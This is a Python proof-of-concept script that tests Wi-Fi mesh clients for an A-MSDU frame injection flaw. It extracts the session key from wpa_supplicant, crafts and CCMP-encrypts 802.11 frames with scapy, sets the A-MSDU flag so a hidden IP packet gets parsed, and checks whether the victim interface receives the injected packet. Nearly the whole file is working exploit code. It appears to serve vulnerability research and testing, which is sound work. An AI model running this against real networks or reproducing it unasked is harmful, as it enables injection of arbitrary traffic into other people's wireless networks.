#!/usr/bin/env python3
import sys, subprocess, socket, select

from wpaspy import Ctrl
import time, subprocess
from libwifi import *

if len(sys.argv) != 3:
	print(f"Usage: {sys.argv[0]} nic_victim nic_attacker")
	quit(1)

iface_victim   = sys.argv[1]
iface_attacker = sys.argv[2]
iface_monitor  = add_virtual_monitor(iface_attacker)
subprocess.check_output(["ifconfig", iface_monitor, "up"])

conf.iface = iface_monitor

STA1 = get_macaddress(iface_victim)
STA2 = get_macaddress(iface_attacker)

# Remove old occurrences of the control interface that didn't get cleaned properly
subprocess.call(["rm", "-rf", "wpaspy_ctrl/"])

# -W parameter makes wpa_supplicant pause on startup until we connect to control interface
cmd = ["../wpa_supplicant/wpa_supplicant", "-Dnl80211", "-i", iface_attacker, "-c", "mesh1.conf", "-dd", "-K"]
process = subprocess.Popen(cmd)
time.sleep(1)

# Connect to the control interface
wpaspy_ctrl = Ctrl("wpaspy_ctrl/" + iface_attacker)
wpaspy_ctrl.attach()

# Let wpa_supplicant run for 10 seconds and then exit
time.sleep(2)

while wpaspy_ctrl.pending():
	wpaspy_ctrl.recv()

key = wpaspy_ctrl.request("GET tk")
try:
	key = bytes.fromhex(key)
	print(">>> Got key", key.hex())
except ValueError:
	pass





class Dot11MeshControl(Packet):
    name = "802.11 Mesh Control Field"
    fields_desc = [ ByteField("flags", 0),
                    ByteField("ttl", 0),
                    LEIntField("seqnum", 0)]

def create_msdu_subframe(src, dst, payload, last=False):
	length = len(payload)
	p = Ether(dst=dst, src=src, type=(length * 0x100))

	payload = raw(payload)

	total_length = len(p) + len(payload)
	padding = ""
	if not last and total_length % 4 != 0:
		padding = b"\x00" * (4 - (total_length % 4))

	return p / payload / Raw(padding)


def test_normal_injection():
	sendp(Ether(src="02:00:00:00:01:00", dst="02:00:00:00:00:00")/IP()/UDP()/Raw(b"Eth injection"), iface=iface_attacker)

	p = Dot11(FCfield="to-DS+from-DS", type=2, SC=(5 << 4), subtype=8, addr1=STA1, addr2=STA2, addr3=STA1, addr4=STA2) \
		/ Dot11QoS(TXOP=1) \
		/ Dot11MeshControl(ttl=0x1f, seqnum=6002) \
		/ LLC()/SNAP()/IP()/UDP()/Raw(b"Raw injection")
	sendp(RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")/p)

	#enc = encrypt_ccmp(p, key, pn=3)
	#print(enc)
	#sendp(RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")/enc)


	p1 = Dot11MeshControl(ttl=0x1f, seqnum=6002) \
		/ LLC()/SNAP()/IP()/UDP()/Raw(b"Raw AMSDU injection 1")
	p2 = Dot11MeshControl(ttl=0x1f, seqnum=6002) \
		/ LLC()/SNAP()/IP()/UDP()/Raw(b"Raw AMSDU injection 2")
	p = Dot11(FCfield="to-DS+from-DS", type=2, SC=(51 << 4), subtype=8, addr1=STA1, addr2=STA2, addr3=STA1, addr4=STA2) \
		/ Dot11QoS(A_MSDU_Present=1, TXOP=1) \
		/ create_msdu_subframe(STA2, STA1, p1, last=False) \
		/ Raw(6 * b"\x22" + 6 * b"\x33" + b"\x00\x08")/Raw(8 * b"\x11" + b"\x00\x00") \
		/ create_msdu_subframe(STA2, STA1, p2, last=True)

	sendp(RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")/p)

	#enc = encrypt_ccmp(p, key, pn=5)
	#print(enc)
	#sendp(RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")/enc)


def simulate_attack():
	p1 = Dot11MeshControl(ttl=0x1f, seqnum=6002) \
		/ LLC()/SNAP()/IP(src="1.2.3.4", dst="5.6.7.8")/UDP()/Raw(b"Simulated A-MSDU attack injection")

	if False:
		# This works
		p = Dot11(FCfield="to-DS+from-DS", type=2, SC=(5 << 4), subtype=8, addr1=STA1, addr2=STA2, addr3=STA1, addr4=STA2) \
			/ Dot11QoS(TXOP=1) 					\
			/ Dot11MeshControl(ttl=0x1f, seqnum=6002) 		\
			/ Raw(b"\xAA\xAA\x03\x00\x00\x00")/Raw(b"\x08\x00")/Raw(8 * b"\x00" + 6 * b"\x11") \
			/ Ether(dst=STA1, src=STA2, type=(len(p1) - 6)*0x100)/p1
	elif False:
		# This works - with a IPv4 header that starts with 0x45 the Mesh Control Field indicates that "Mesh Address Extension subfield contains Address 4"
		p = Dot11(FCfield="to-DS+from-DS", type=2, SC=(5 << 4), subtype=8, addr1=STA1, addr2=STA2, addr3=STA1, addr4=STA2) \
			/ Dot11QoS(TXOP=1) 					\
			/ Dot11MeshControl(ttl=0x1f, seqnum=6002) 		\
			/ Raw(b"\xAA\xAA\x03\x00\x00\x00")/Raw(b"\x08\x00")/Raw(b"\x45" + 7 * b"\x00" + 12 * b"\x11" + b"\x00\x00") \
			/ Ether(dst=STA1, src=STA2, type=(len(p1) - 6)*0x100)/p1
	elif True:
		# Now with full LLC/SNAP/IP header to show feasibility! This works!
		print("\n\n>>> Sending simulated attacker IPv4 single MSDU marked but marked as A-MSDU...\n\n")
		p = Dot11(FCfield="to-DS+from-DS", type=2, SC=(5 << 4), subtype=8, addr1=STA1, addr2=STA2, addr3=STA1, addr4=STA2) \
			/ Dot11QoS(TXOP=1) 					\
			/ Dot11MeshControl(ttl=0x1f, seqnum=6002) 		\
			/ LLC()/SNAP()/IP()/Raw(b"\x00\x00")			\
			/ Ether(dst=STA1, src=STA2, type=(len(p1) - 6)*0x100)/p1


	#p[Dot11QoS].A_MSDU_Present = 1
	#sendp(RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")/p)

	print("Plaintext:", repr(p))
	enc = encrypt_ccmp(p, key, pn=5)
	enc[Dot11QoS].A_MSDU_Present = 1
	print("Encrypted:", repr(enc))
	sendp(RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")/enc)


s = L2Socket(type=ETH_P_ALL, iface=iface_victim)

simulate_attack()
time.sleep(1)

vulnerable = False
while True:
	ready, _, _ = select.select([s], [], [], 0)
	if not ready:
		break

	data = s.recv()
	if b"Simulated A-MSDU attack injection" in raw(data):
		ip = IP(raw(data)[14:])
		if ip.src == "1.2.3.4" and ip.dst == "5.6.7.8":
			vulnerable = True
			break

if vulnerable:
	print("\n\n>>> ATTACK WORKED! Received injected packet\n\n")
	print(repr(ip))
else:
	print("\n\n>>> Couldn't detect injected packet. Client looks secure.\n\n")


time.sleep(5)
wpaspy_ctrl.request("TERMINATE")
process.wait()

